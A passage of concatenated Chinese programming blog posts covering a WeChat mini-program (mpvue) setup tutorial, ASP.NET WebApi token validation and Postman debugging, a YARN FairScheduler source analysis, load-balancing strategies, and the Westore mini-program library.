      "selectedIconPath":"static/img/me-active.png"
    }
  ]
  }

  
}

3.效果图

 
 4.代码封装
 1.打开cmd，cd到server下，运行后端

npm run dev

2.在mydemo/src 目录下，新建config.js

//配置项

const host="http://localhost:5757"

const config={
    host
}
export default config

3.在src目录下新建until.js

//工具函数

import config from './config'

export function get(url){
    return new Promise((reslove,reject)=>{
        wx.request({
            url:config.host+url,
            success:function(res){
                if(res.data.code===0){
                    reslove(res.data.data)
                }else{
                    reject(res.data)
                }
            }
        })
    })
}

4.App.vue中添加代码

<script>
import {get} from './until'

export default {
  async created () {
    // 调用API从本地缓存中获取数据
    const logs = wx.getStorageSync('logs') || []
    logs.unshift(Date.now())
    wx.setStorageSync('logs', logs)

    const res=await get('/weapp/demo')
    console.log(123,res)
    console.log('小程序启动了')
  }
}
</script>

<style>
.container {
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: space-between;
  padding: 200rpx 0;
  box-sizing: border-box;
}
/* this rule will be remove */
* {
  transition: width 2s;
  -moz-transition: width 2s;
  -webkit-transition: width 2s;
  -o-transition: width 2s;
}
</style>


5.在微信开发者工具中，在右上角点击【详情】，勾选不校验合法域名

6.运行mydemo

npm run dev


 
 5.使用ESLint自动规范代码
1.将mydemo/build/webpck.base.conf.js中之前注释的代码恢复

2.在mydemo项目下的package.json中的“lint”配置中加入--fix

3.执行代码，规范代码

npm run lint//如果一般的格式错误，就会自动修改，如果有代码上的错误，则会报出位置错误

4.执行运行代码

npm run dev

发现已经不报错啦！
********************************************************************************************************************************************************************************************************
ASP.NET MVC5+EF6+EasyUI 后台管理系统-WebApi的用法与调试
1：ASP.NET MVC5+EF6+EasyUI 后台管理系统（1）-WebApi与Unity注入 使用Unity是为了使用我们后台的BLL和DAL层
2：ASP.NET MVC5+EF6+EasyUI 后台管理系统（2）-WebApi与Unity注入-配置文件
3：ASP.NET MVC5+EF6+EasyUI 后台管理系统（3）-MVC WebApi 用户验证 (1)
4：ASP.NET MVC5+EF6+EasyUI 后台管理系统（4）-MVC WebApi 用户验证 (2)

以往我们讲了WebApi的基础验证，但是有新手经常来问我使用的方式
这次我们来分析一下代码的用法，以及调试的方式
WebApi在一些场景我们会用到，比如：

1.对接各种客户端（移动设备）
2.构建常见的http微服务 
3.开放数据 
4.单点登陆  等...


本文主要演示几点：主要也是对以往的回顾整理

1.使用HelpPage文档
2.Postman对接口进行调试（之前的样例太过简单，这次加一些参数，让初学者多看到这些场景）
3.调试接口

1.HelpPage Api帮助文档
我们新建的WebApi集成了微软自带的HelpPage，即Api的文档，在我们编写好接口之后会自动生成一份文档
配置HelpPage，非常简单，分两步
设置项目属性的输出XML文档

2.打开Areas-->HelpPage-->App_Start-->HelpPageConfig.cs

    public static void Register(HttpConfiguration config)
        {
            //// Uncomment the following to use the documentation from XML documentation file.
            config.SetDocumentationProvider(new XmlDocumentationProvider(HttpContext.Current.Server.MapPath("~/bin/Apps.WebApi.XML")));

设置Register方法就行，运行地址localhost:1593/help得到如下结果

从图中可以看出，每一个控制器的接口都会列出来，并根据注释和参数生成文档，全自动
点击接口可以看到参数和请求方式

2.使用Postman调试
下载地址：https://www.getpostman.com/
Pastman非常易用，我们下面就拿登陆接口来测试

打开Postman，新建一个请求

OK，我们已经获得token！注意，新建请求的时候，要设置GET,POST
 
3.验证权限
之前的文章，我们是通过令牌的方式+接口权限来访问接口数据的
打开SupperFilter.cs过滤器代码

//url获取token
            var content = actionContext.Request.Properties[ConfigPara.MS_HttpContext] as HttpContextBase;

            var token = content.Request.QueryString[ConfigPara.Token];
            if (!string.IsNullOrEmpty(token))
            {
                //解密用户ticket,并校验用户名密码是否匹配

                //读取请求上下文中的Controller,Action,Id
                var routes = new RouteCollection();
                RouteConfig.RegisterRoutes(routes);
                RouteData routeData = routes.GetRouteData(content);
                //取出区域的控制器Action,id
                string controller = actionContext.ActionDescriptor.ControllerDescriptor.ControllerName;
                string action = actionContext.ActionDescriptor.ActionName;
                //URL路径
                string filePath = HttpContext.Current.Request.FilePath;
                //判断token是否有效
                if (!LoginUserManage.ValidateTicket(token))
                {
                    HandleUnauthorizedRequest(actionContext);
                }

                //判断是否角色组授权（如果不需要使用角色组授权可以注释掉这个方法，这样就是登录用户都可以访问所有接口）
                if (!ValiddatePermission(token, controller, action, filePath))
                {
                    HandleUnauthorizedRequest(actionContext);
                }

                //已经登录，有权限
                base.IsAuthorized(actionContext);

过滤器中会读取到用户传过来的token并进行2个逻辑验证
1.验证token是否有效
2.验证接口有没有权限（通过后台分配权限来获取Action）这个操作跟我们授权界面是一样的 
（注：如果注释掉即所有登陆用户都可以访问所有接口，不受控制，主要看业务场景吧）
 
4.通过Token向其他接口拿数据
看到SysSampleController类，这个类和普通MVC里面的样例的接口其实没有什么区别，BLL后的所有都是通用的，所以逻辑就不需要重新写了！按照第二点的获得token，配置到Postman可以获得数据

1.查询

2.创建

3.修改

4.获取明细

5.删除
 

 谢谢，从源码直接可以看出，和自己测试或者自己配置一遍，不失是一种体验

 
********************************************************************************************************************************************************************************************************
别被官方文档迷惑了！这篇文章帮你详解yarn公平调度
欢迎大家前往腾讯云+社区，获取更多腾讯海量技术实践干货哦~

本文由@edwinhzhang发表于云+社区专栏

FairScheduler是yarn常用的调度器，但是仅仅参考官方文档，有很多参数和概念文档里没有详细说明，但是这些参明显会影响到集群的正常运行。本文的主要目的是通过梳理代码将关键参数的功能理清楚。下面列出官方文档中常用的参数：



yarn.scheduler.fair.preemption.cluster-utilization-threshold
The utilization threshold after which preemption kicks in. The utilization is computed as the maximum ratio of usage to capacity among all resources. Defaults to 0.8f.




yarn.scheduler.fair.update-interval-ms
The interval at which to lock the scheduler and recalculate fair shares, recalculate demand, and check whether anything is due for preemption. Defaults to 500 ms.


maxAMShare
limit the fraction of the queue’s fair share that can be used to run application masters. This property can only be used for leaf queues. For example, if set to 1.0f, then AMs in the leaf queue can take up to 100% of both the memory and CPU fair share. The value of -1.0f will disable this feature and the amShare will not be checked. The default value is 0.5f.


minSharePreemptionTimeout
number of seconds the queue is under its minimum share before it will try to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.


fairSharePreemptionTimeout
number of seconds the queue is under its fair share threshold before it will try to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.


fairSharePreemptionThreshold
If the queue waits fairSharePreemptionTimeout without receiving fairSharePreemptionThreshold*fairShare resources, it is allowed to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.



在上述参数描述中，timeout等参数值没有给出默认值，没有告知不设置会怎样。minShare,fairShare等概念也没有说清楚，很容易让人云里雾里。关于这些参数和概念的详细解释，在下面的分析中一一给出。
FairScheduler整体结构
 图（1） FairScheduler 运行流程图
公平调度器的运行流程就是RM去启动FairScheduler,SchedulerDispatcher两个服务，这两个服务各自负责update线程，handle线程。
update线程有两个任务：（1）更新各个队列的资源（Instantaneous Fair Share）,（2）判断各个leaf队列是否需要抢占资源（如果开启抢占功能）
handle线程主要是处理一些事件响应，比如集群增加节点，队列增加APP，队列删除APP，APP更新container等。
FairScheduler类图
图（2） FairScheduler相关类图
队列继承模块：yarn通过树形结构来管理队列。从管理资源角度来看，树的根节点root队列（FSParentQueue）,非根节点（FSParentQueue），叶子节点（FSLeaf）,app任务（FSAppAttempt，公平调度器角度的App）都是抽象的资源，它们都实现了Schedulable接口，都是一个可调度资源对象。它们都有自己的fair share（队列的资源量）方法（这里又用到了fair share概念），weight属性（权重）、minShare属性（最小资源量）、maxShare属性(最大资源量)，priority属性(优先级)、resourceUsage属性（资源使用量属性）以及资源需求量属性(demand)，同时也都实现了preemptContainer抢占资源的方法，assignContainer方法（为一个ACCEPTED的APP分配AM的container）。
public interface Schedulable {
  /**
   * Name of job/queue, used for debugging as well as for breaking ties in
   * scheduling order deterministically.
   */
  public String getName();

  /**
   * Maximum number of resources required by this Schedulable. This is defined as
   * number of currently utilized resources + number of unlaunched resources (that
   * are either not yet launched or need to be speculated).
   */
  public Resource getDemand();

  /** Get the aggregate amount of resources consumed by the schedulable. */
  public Resource getResourceUsage();

  /** Minimum Resource share assigned to the schedulable. */
  public Resource getMinShare();

  /** Maximum Resource share assigned to the schedulable. */
  public Resource getMaxShare();

  /** Job/queue weight in fair sharing. */
  public ResourceWeights getWeights();

  /** Start time for jobs in FIFO queues; meaningless for QueueSchedulables.*/
  public long getStartTime();

 /** Job priority for jobs in FIFO queues; meaningless for QueueSchedulables. */
  public Priority getPriority();

  /** Refresh the Schedulable's demand and those of its children if any. */
  public void updateDemand();

  /**
   * Assign a container on this node if possible, and return the amount of
   * resources assigned.
   */
  public Resource assignContainer(FSSchedulerNode node);

  /**
   * Preempt a container from this Schedulable if possible.
   */
  public RMContainer preemptContainer();

  /** Get the fair share assigned to this Schedulable. */
  public Resource getFairShare();

  /** Assign a fair share to this Schedulable. */
  public void setFairShare(Resource fairShare);
}
队列运行模块：从类图角度描述公平调度的工作原理。SchedulerEventDispatcher类负责管理handle线程。FairScheduler类管理update线程，通过QueueManager获取所有队列信息。
我们从Instantaneous Fair Share 和Steady Fair Share 这两个yarn的基本概念开始进行代码分析。
Instantaneous Fair Share & Steady Fair Share
Fair Share指的都是Yarn根据每个队列的权重、最大，最小可运行资源计算的得到的可以分配给这个队列的最大可用资源。本文描述的是公平调度，公平调度的默认策略FairSharePolicy的规则是single-resource，即只关注内存资源这一项指标。
Steady Fair Share：是每个队列内存资源量的固定理论值。Steady Fair Share在RM初期工作后不再轻易改变，只有后续在增加节点（addNode）时才会重新计算。RM的初期工作也是handle线程把集群的每个节点添加到调度器中（addNode）。
Instantaneous Fair Share：是每个队列的内存资源量的实际值，是在动态变化的。yarn里的fair share如果没有专门指代，都是指的的Instantaneous Fair Share。
1 Steady Fair Share计算方式
 图（3） steady fair share 计算流程
handle线程如果接收到NODE_ADDED事件，会去调用addNode方法。
  private synchronized void addNode(RMNode node) {
    FSSchedulerNode schedulerNode = new FSSchedulerNode(node, usePortForNodeName);
    nodes.put(node.getNodeID(), schedulerNode);
    //将该节点的内存加入到集群总资源
    Resources.addTo(clusterResource, schedulerNode.getTotalResource());
    //更新available资源
    updateRootQueueMetrics();
    //更新一个container的最大分配，就是UI界面里的MAX（如果没有记错的话）
    updateMaximumAllocation(schedulerNode, true);

    //设置root队列的steadyFailr=clusterResource的总资源
    queueMgr.getRootQueue().setSteadyFairShare(clusterResource);
    //重新计算SteadyShares
    queueMgr.getRootQueue().recomputeSteadyShares();
    LOG.info("Added node " + node.getNodeAddress() +
        " cluster capacity: " + clusterResource);
  }
recomputeSteadyShares 使用广度优先遍历计算每个队列的内存资源量，直到叶子节点。
 public void recomputeSteadyShares() {
    //广度遍历整个队列树
    //此时getSteadyFairShare 为clusterResource
    policy.computeSteadyShares(childQueues, getSteadyFairShare());
    for (FSQueue childQueue : childQueues) {
      childQueue.getMetrics().setSteadyFairShare(childQueue.getSteadyFairShare());
      if (childQueue instanceof FSParentQueue) {
        ((FSParentQueue) childQueue).recomputeSteadyShares();
      }
    }
  }
computeSteadyShares方法计算每个队列应该分配到的内存资源，总体来说是根据每个队列的权重值去分配，权重大的队列分配到的资源更多，权重小的队列分配到得资源少。但是实际的细节还会受到其他因素影响，是因为每队列有minResources和maxResources两个参数来限制资源的上下限。computeSteadyShares最终去调用computeSharesInternal方法。比如以下图为例：
图中的数字是权重，假如有600G的总资源，parent=300G,leaf1=300G,leaf2=210G,leaf3=70G。
图（4） yarn队列权重
computeSharesInternal方法概括来说就是通过二分查找法寻找到一个资源比重值R（weight-to-slots），使用这个R为每个队列分配资源（在该方法里队列的类型是Schedulable,再次说明队列是一个资源对象），公式是steadyFairShare=R * QueueWeights。
computeSharesInternal是计算Steady Fair Share 和Instantaneous Fair Share共用的方法，根据参数isSteadyShare来区别计算。
之所以要做的这么复杂，是因为队列不是单纯的按照比例来分配资源的（单纯按权重比例，需要maxR,minR都不设置。maxR的默认值是0x7fffffff，minR默认值是0）。如果设置了maxR,minR,按比例分到的资源小于minR,那么必须满足minR。按比例分到的资源大于maxR，那么必须满足maxR。因此想要找到一个R（weight-to-slots）来尽可能满足：

R*（Queue1Weights + Queue2Weights+...+QueueNWeights） <=totalResource
R*QueueWeights >= minShare
R*QueueWeights <= maxShare

注：QueueNWeights为队列各自的权重，minShare和maxShare即各个队列的minResources和maxResources
computcomputeSharesInternal详细来说分为四个步骤：

确定可用资源：totalResources = min(totalResources-takenResources(fixedShare), totalMaxShare)
确定R上下限
二分查找法逼近R
使用R设置fair Share

  private static void computeSharesInternal(
      Collection<? extends Schedulable> allSchedulables,
      Resource totalResources, ResourceType type, boolean isSteadyShare) {

    Collection<Schedulable> schedulables = new ArrayList<Schedulable>();
    //第一步
    //排除有固定资源不能动的队列,并得出固定内存资源
    int takenResources = handleFixedFairShares(
        allSchedulables, schedulables, isSteadyShare, type);

    if (schedulables.isEmpty()) {
      return;
    }
    // Find an upper bound on R that we can use in our binary search. We start
    // at R = 1 and double it until we have either used all the resources or we
    // have met all Schedulables' max shares.
    int totalMaxShare = 0;
    //遍历schedulables（非固定fixed队列），将各个队列的资源相加得到totalMaxShare
    for (Schedulable sched : schedulables) {
      int maxShare = getResourceValue(sched.getMaxShare(), type);
      totalMaxShare = (int) Math.min((long)maxShare + (long)totalMaxShare,
          Integer.MAX_VALUE);
      if (totalMaxShare == Integer.MAX_VALUE) {
        break;
      }
    }
    //总资源要减去fiexd share
    int totalResource = Math.max((getResourceValue(totalResources, type) -
        takenResources), 0);
    //队列所拥有的最大资源是有集群总资源和每个队列的MaxResource双重限制
    totalResource = Math.min(totalMaxShare, totalResource);
    //第二步:设置R的上下限
    double rMax = 1.0;
    while (resourceUsedWithWeightToResourceRatio(rMax, schedulables, type)
        < totalResource) {
      rMax *= 2.0;
    }

    //第三步：二分法逼近合理R值
    // Perform the binary search for up to COMPUTE_FAIR_SHARES_ITERATIONS steps
    double left = 0;
    double right = rMax;
    for (int i = 0; i < COMPUTE_FAIR_SHARES_ITERATIONS; i++) {
      double mid = (left + right) / 2.0;
      int plannedResourceUsed = resourceUsedWithWeightToResourceRatio(
          mid, schedulables, type);
      if (plannedResourceUsed == totalResource) {
        right = mid;
        break;
      } else if (plannedResourceUsed < totalResource) {
        left = mid;
      } else {
        right = mid;
      }
    }
    //第四步：使用R值设置，确定各个非fixed队列的fairShar,意味着只有活跃队列可以分资源
    // Set the fair shares based on the value of R we've converged to
    for (Schedulable sched : schedulables) {
      if (isSteadyShare) {
        setResourceValue(computeShare(sched, right, type),
            ((FSQueue) sched).getSteadyFairShare(), type);
      } else {
        setResourceValue(
            computeShare(sched, right, type), sched.getFairShare(), type);
      }
    }
  }
(1) 确定可用资源
handleFixedFairShares方法来统计出所有fixed队列的fixed内存资源（fixedShare）相加，并且fixed队列排除掉不得瓜分系统资源。yarn确定fixed队列的标准如下：
  private static int getFairShareIfFixed(Schedulable sched,
      boolean isSteadyShare, ResourceType type) {

    //如果队列的maxShare <=0  则是fixed队列，fixdShare=0
    if (getResourceValue(sched.getMaxShare(), type) <= 0) {
      return 0;
    }

    //如果是计算Instantaneous Fair Share,并且该队列内没有APP再跑，
    // 则是fixed队列，fixdShare=0
    if (!isSteadyShare &&
        (sched instanceof FSQueue) && !((FSQueue)sched).isActive()) {
      return 0;
    }

    //如果队列weight<=0,则是fixed队列
    //如果对列minShare <=0,fixdShare=0,否则fixdShare=minShare
    if (sched.getWeights().getWeight(type) <= 0) {
      int minShare = getResourceValue(sched.getMinShare(), type);
      return (minShare <= 0) ? 0 : minShare;
    }

    return -1;
  }
(2)确定R上下限
R的下限为1.0，R的上限是由resourceUsedWithWeightToResourceRatio方法来确定。该方法确定的资源值W，第一步中确定的可用资源值T：W>=T时，R才能确定。
//根据R值去计算每个队列应该分配的资源
  private static int resourceUsedWithWeightToResourceRatio(double w2rRatio,
      Collection<? extends Schedulable> schedulables, ResourceType type) {
    int resourcesTaken = 0;
    for (Schedulable sched : schedulables) {
      int share = computeShare(sched, w2rRatio, type);
      resourcesTaken += share;
    }
    return resourcesTaken;
  }
 private static int computeShare(Schedulable sched, double w2rRatio,
      ResourceType type) {
    //share=R*weight,type是内存
    double share = sched.getWeights().getWeight(type) * w2rRatio;
    share = Math.max(share, getResourceValue(sched.getMinShare(), type));
    share = Math.min(share, getResourceValue(sched.getMaxShare(), type));
    return (int) share;
  }
（3）二分查找法逼近R
满足下面两个条件中的一个即可终止二分查找：

W == T(步骤2中的W和T)
超过25次（COMPUTE_FAIR_SHARES_ITERATIONS）

（4）使用R设置fair share
设置fair share时，可以看到区分了Steady Fair Share 和Instantaneous Fair Share。
  for (Schedulable sched : schedulables) {
      if (isSteadyShare) {
        setResourceValue(computeShare(sched, right, type),
            ((FSQueue) sched).getSteadyFairShare(), type);
      } else {
        setResourceValue(
            computeShare(sched, right, type), sched.getFairShare(), type);
      }
    }
2 Instaneous Fair Share计算方式
图（5）Instaneous Fair Share 计算流程
该计算方式与steady fair的计算调用栈是一致的，最终都要使用到computeSharesInternal方法，唯一不同的是计算的时机不一样。steady fair只有在addNode的时候才会重新计算一次，而Instantaneous Fair Share是由update线程定期去更新。
此处强调的一点是，在上文中我们已经分析如果是计算Instantaneous Fair Share，并且队列为空，那么该队列就是fixed队列，也就是非活跃队列，那么计算fair share时，该队列是不会去瓜分集群的内存资源。
而update线程的更新频率就是由 yarn.scheduler.fair.update-interval-ms来决定的。
private class UpdateThread extends Thread {

    @Override
    public void run() {
      while (!Thread.currentThread().isInterrupted()) {
        try {
          //yarn.scheduler.fair.update-interval-ms
          Thread.sleep(updateInterval);
          long start = getClock().getTime();
          // 更新Instantaneous Fair Share
          update();
          //抢占资源
          preemptTasksIfNecessary();
          long duration = getClock().getTime() - start;
          fsOpDurations.addUpdateThreadRunDuration(duration);
        } catch (InterruptedException ie) {
          LOG.warn("Update thread interrupted. Exiting.");
          return;
        } catch (Exception e) {
          LOG.error("Exception in fair scheduler UpdateThread", e);
        }
      }
    }
  }
3 maxAMShare意义
handle线程如果接收到NODE_UPDATE事件，如果（1）该node的机器内存资源满足条件，（2）并且有ACCEPTED状态的Application，那么将会为该待运行的APP的AM分配一个container，使该APP在所处的queue中跑起来。但在分配之前还需要一道检查canRuunAppAM。能否通过canRuunAppAM,就是由maxAMShare参数限制。
  public boolean canRunAppAM(Resource amResource) {
    //默认是0.5f
    float maxAMShare =
        scheduler.getAllocationConfiguration().getQueueMaxAMShare(getName());
    if (Math.abs(maxAMShare - -1.0f) < 0.0001) {
      return true;
    }
    //该队的maxAMResource=maxAMShare * fair share(Instantaneous Fair Share)
    Resource maxAMResource = Resources.multiply(getFairShare(), maxAMShare);
    //amResourceUsage是该队列已经在运行的App的AM所占资源累加和
    Resource ifRunAMResource = Resources.add(amResourceUsage, amResource);
    //查看当前ifRunAMResource是否超过maxAMResource
    return !policy
        .checkIfAMResourceUsageOverLimit(ifRunAMResource, maxAMResource);
  }
上面代码我们用公式来描述：

队列中运行的APP为An，每个APP的AM占用资源为R
ACCEPTED状态（待运行）的APP的AM大小为R1
队列的fair share为QueFS
队列的maxAMResource=maxAMShare * QueFS
ifRunAMResource=A1.R+A2.R+...+An.R+R1
ifRunAMResource > maxAMResource，则该队列不能接纳待运行的APP

之所以要关注这个参数，是因为EMR很多客户在使用公平队列时会反映集群的总资源没有用满，但是还有APP在排队，没有跑起来，如下图所示：
图（6） APP阻塞实例
公平调度默认策略不关心Core的资源，只关心Memory。图中Memory用了292G，还有53.6G的内存没用，APP就可以阻塞。原因就是default队列所有运行中APP的AM资源总和超过了（345.6 * 0.5），导致APP阻塞。
总结
通过分析fair share的计算流程，搞清楚yarn的基本概念和部分参数，从下面的表格对比中，我们也可以看到官方的文档对概念和参数的描述是比较难懂的。剩余的参数放在第二篇-公平调度之抢占中分析。




官方描述
总结




Steady Fair Share
The queue’s steady fair share of resources. These shares consider all the queues irrespective of whether they are active (have running applications) or not. These are computed less frequently and change only when the configuration or capacity changes.They are meant to provide visibility into resources the user can expect, and hence displayed in the Web UI.
每个非fixed队列内存资源量的固定理论值。Steady Fair Share在RM初期工作后不再轻易改变，只有后续在增加节点改编配置（addNode）时才会重新计算。RM的初期工作也是handle线程把集群的每个节点添加到调度器中（addNode）。


Instantaneous Fair Share
The queue’s instantaneous fair share of resources. These shares consider only actives queues (those with running applications), and are used for scheduling decisions. Queues may be allocated resources beyond their shares when other queues aren’t using them. A queue whose resource consumption lies at or below its instantaneous fair share will never have its containers preempted.
每个非fixed队列(活跃队列)的内存资源量的实际值，是在动态变化的，由update线程去定时更新队列的fair share。yarn里的fair share如果没有专门指代，都是指的的Instantaneous Fair Share。


yarn.scheduler.fair.update-interval-ms
The interval at which to lock the scheduler and recalculate fair shares, recalculate demand, and check whether anything is due for preemption. Defaults to 500 ms.
update线程的间隔时间，该线程的工作是1更新fair share，2检查是否需要抢占资源。


maxAMShare
limit the fraction of the queue’s fair share that can be used to run application masters. This property can only be used for leaf queues. For example, if set to 1.0f, then AMs in the leaf queue can take up to 100% of both the memory and CPU fair share. The value of -1.0f will disable this feature and the amShare will not be checked. The default value is 0.5f.
队列所有运行中的APP的AM资源总和必须不能超过maxAMShare * fair share




问答
如何将yarn 升级到特定版本？
相关阅读
Yarn与Mesos
Spark on Yarn | Spark，从入门到精通
YARN三大模块介绍
【每日课程推荐】机器学习实战！快速入门在线广告业务及CTR相应知识

此文已由作者授权腾讯云+社区发布，更多原文请点击
搜索关注公众号「云加社区」，第一时间获取技术干货，关注后回复1024 送你一份技术课程大礼包！
海量技术实践经验，尽在云加社区！

********************************************************************************************************************************************************************************************************
分布式系统关注点——仅需这一篇，吃透「负载均衡」妥妥的

本文长度为3426字，预计读完需1.2MB流量，建议阅读9分钟。

 
阅读目录





「负载均衡」是什么？
常用「负载均衡」策略图解
常用「负载均衡」策略优缺点和适用场景
用「健康探测」来保障高可用
结语





 
 
　　上一篇《分布式系统关注点——初识「高可用」》我们对「高可用」有了一个初步认识，其中认为「负载均衡」是「高可用」的核心工作。那么，本篇将通过图文并茂的方式，来描述出每一种负载均衡策略的完整样貌。
 
 

一、「负载均衡」是什么
        正如题图所示的这样，由一个独立的统一入口来收敛流量，再做二次分发的过程就是「负载均衡」，它的本质和「分布式系统」一样，是「分治」。
 
        如果大家习惯了开车的时候用一些导航软件，我们会发现，导航软件的推荐路线方案会有一个数量的上限，比如3条、5条。因此，其实本质上它也起到了一个类似「负载均衡」的作用，因为如果只能取Top3的通畅路线，自然拥堵严重的路线就无法推荐给你了，使得车流的压力被分摊到了相对空闲的路线上。
 
        在软件系统中也是一样的道理，为了避免流量分摊不均，造成局部节点负载过大（如CPU吃紧等），所以引入一个独立的统一入口来做类似上面的“导航”的工作。但是，软件系统中的「负载均衡」与导航的不同在于，导航是一个柔性策略，最终还是需要使用者做选择，而前者则不同。
 
        怎么均衡的背后是策略在起作用，而策略的背后是由某些算法或者说逻辑来组成的。比如，导航中的算法属于「路径规划」范畴，在这个范畴内又细分为「静态路径规划」和「动态路径规划」，并且，在不同的分支下还有各种具体计算的算法实现，如Dijikstra、A*等。同样的，在软件系统中的负载均衡，也有很多算法或者说逻辑在支撑着这些策略，巧的是也有静态和动态之分。
 
 

二、常用「负载均衡」策略图解
        下面来罗列一下日常工作中最常见的5种策略。
 
01  轮询
 
　　这是最常用也最简单策略，平均分配，人人都有、一人一次。大致的代码如下。
 

int  globalIndex = 0;   //注意是全局变量，不是局部变量。

try
{

    return servers[globalIndex];
}
finally
{
    globalIndex++;
    if (globalIndex == 3)
        globalIndex = 0;
}

 
02  加权轮询

        在轮询的基础上，增加了一个权重的概念。权重是一个泛化后的概念，可以用任意方式来体现，本质上是一个能者多劳思想。比如，可以根据宿主的性能差异配置不同的权重。大致的代码如下。
 

int matchedIndex = -1;
int total = 0;
for (int i = 0; i < servers.Length; i++)
{
      servers[i].cur_weight += servers[i].weight;//①每次循环的时候做自增（步长=权重值）
      total += servers[i].weight;//②将每个节点的权重值累加到汇总值中
      if (matchedIndex == -1 || servers[matchedIndex].cur_weight < servers[i].cur_weight) //③如果 当前节点的自增数 > 当前待返回节点的自增数，则覆盖。
      {
            matchedIndex = i;
      }
}

servers[matchedIndex].cur_weight -= total;//④被选取的节点减去②的汇总值，以降低下一次被选举时的初始权重值。
return servers[matchedIndex];

 
        这段代码的过程如下图的表格。"()"中的数字就是自增数，代码中的cur_weight。
 

 
        值得注意的是，加权轮询本身还有不同的实现方式，虽说最终的比例都是2：1：2。但是在请求送达的先后顺序上可以所有不同。比如「5-4，3，2-1」和上面的案例相比，最终比例是一样的，但是效果不同。「5-4，3，2-1」更容易产生并发问题，导致服务端拥塞，且这个问题随着权重数字越大越严重。例子：10：5：3的结果是「18-17-16-15-14-13-12-11-10-9，8-7-6-5-4，3-2-1」 
 
03  最少连接数

        这是一种根据实时的负载情况，进行动态负载均衡的方式。维护好活动中的连接数量，然后取最小的返回即可。大致的代码如下。
 

var matchedServer = servers.orderBy(e => e.active_conns).first();

matchedServer.active_conns += 1;

return matchedServer;

//在连接关闭时还需对active_conns做减1的动作。

 
04  最快响应

        这也是一种动态负载均衡策略，它的本质是根据每个节点对过去一段时间内的响应情况来分配，响应越快分配的越多。具体的运作方式也有很多，上图的这种可以理解为，将最近一段时间的请求耗时的平均值记录下来，结合前面的「加权轮询」来处理，所以等价于2：1：3的加权轮询。
 
        题外话：一般来说，同机房下的延迟基本没什么差异，响应时间的差异主要在服务的处理能力上。如果在跨地域（例：浙江->上海，还是浙江->北京）的一些请求处理中运用，大多数情况会使用定时「ping」的方式来获取延迟情况，因为是OSI的L3转发，数据更干净，准确性更高。
 
05  Hash法

        hash法的负载均衡与之前的几种不同在于，它的结果是由客户端决定的。通过客户端带来的某个标识经过一个标准化的散列函数进行打散分摊。
 
        上图中的散列函数运用的是最简单粗暴的「取余法」。
        题外话：散列函数除了取余之外，还有诸如「变基」、「折叠」、「平方取中法」等等，此处不做展开，有兴趣的小伙伴可自行查阅资料。
 
        另外，被求余的参数其实可以是任意的，只要最终转化成一个整数参与运算即可。最常用的应该是用来源ip地址作为参数，这样可以确保相同的客户端请求尽可能落在同一台服务器上。
 
 

三、常用「负载均衡」策略优缺点和适用场景
        我们知道，没有完美的事物，负载均衡策略也是一样。上面列举的这些最常用的策略也有各自的优缺点和适用场景，我稍作了整理，如下。
 

 
        这些负载均衡算法之所以常用也是因为简单，想要更优的效果，必然就需要更高的复杂度。比如，可以将简单的策略组合使用、或者通过更多维度的数据采样来综合评估、甚至是基于进行数据挖掘后的预测算法来做。
 
 

四、用「健康探测」来保障高可用
        不管是什么样的策略，难免会遇到机器故障或者程序故障的情况。所以要确保负载均衡能更好的起到效果，还需要结合一些「健康探测」机制。定时的去探测服务端是不是还能连上，响应是不是超出预期的慢。如果节点属于“不可用”的状态的话，需要将这个节点临时从待选取列表中移除，以提高可用性。一般常用的「健康探测」方式有3种。
 
01  HTTP探测
        使用Get/Post的方式请求服务端的某个固定的URL，判断返回的内容是否符合预期。一般使用Http状态码、response中的内容来判断。
 
02  TCP探测
        基于Tcp的三次握手机制来探测指定的IP + 端口。最佳实践可以借鉴阿里云的SLB机制，如下图。

▲图片来源于阿里云，版权归原作者所有
        值得注意的是，为了尽早释放连接，在三次握手结束后立马跟上RST来中断TCP连接。
 
03  UDP探测
        可能有部分应用使用的UDP协议。在此协议下可以通过报文来进行探测指定的IP + 端口。最佳实践同样可以借鉴阿里云的SLB机制，如下图。

▲图片来源于阿里云，版权归原作者所有
 
        结果的判定方式是：在服务端没有返回任何信息的情况下，默认正常状态。否则会返回一个ICMP的报错信息。
 
 

五、结语
        用一句话来概括负载均衡的本质是：

        将请求或者说流量，以期望的规则分摊到多个操作单元上进行执行。






        通过它可以实现横向扩展（scale out），将冗余的作用发挥为「高可用」。另外，还可以物尽其用，提升资源使用率。
 
 
相关文章：


分布式系统关注点——初识「高可用」












 
 
 
作者：Zachary（个人微信号：Zachary-ZF）
微信公众号（首发）：跨界架构师。<-- 点击后阅读热门文章，或右侧扫码关注 -->
定期发表原创内容：架构设计丨分布式系统丨产品丨运营丨一些深度思考。
********************************************************************************************************************************************************************************************************
小程序解决方案 Westore - 组件、纯组件、插件开发
数据流转
先上一张图看清 Westore 怎么解决小程序数据难以管理和维护的问题:

非纯组件的话，可以直接省去 triggerEvent 的过程，直接修改 store.data 并且 update，形成缩减版单向数据流。
Github: https://github.com/dntzhang/westore
组件
这里说的组件便是自定义组件，使用原生小程序的开发格式如下:

Component({
  properties: { },

  data: { },

  methods: { }
})
使用 Westore 之后:
import create from '../../utils/create'

create({
  properties: { },

  data: { },

  methods: { }
})
看着差别不大，但是区别：

Component 的方式使用 setData 更新视图
create 的方式直接更改 store.data 然后调用 update
create 的方式可以使用函数属性，Component 不可以，如：

export default {
  data: {
    firstName: 'dnt',
    lastName: 'zhang',
    fullName:function(){
      return this.firstName + this.lastName
    }
  }
}
绑定到视图:
<view>{{fullName}}</view>
小程序 setData 的痛点:

使用 this.data 可以获取内部数据和属性值，但不要直接修改它们，应使用 setData 修改
setData 编程体验不好，很多场景直接赋值更加直观方便
setData 卡卡卡慢慢慢，JsCore 和 Webview 数据对象来回传浪费计算资源和内存资源
组件间通讯或跨页通讯会把程序搞得乱七八糟，变得极难维护和扩展

没使用 westore 的时候经常可以看到这样的代码:

使用完 westore 之后:

上面两种方式也可以混合使用。
可以看到，westore 不仅支持直接赋值，而且 this.update 兼容了 this.setData 的语法，但性能大大优于 this.setData，再举个例子：
this.store.data.motto = 'Hello Westore'
this.store.data.b.arr.push({ name: 'ccc' })
this.update()
等同于
this.update({
  motto:'Hello Westore',
  [`b.arr[${this.store.data.b.arr.length}]`]:{name:'ccc'}
})
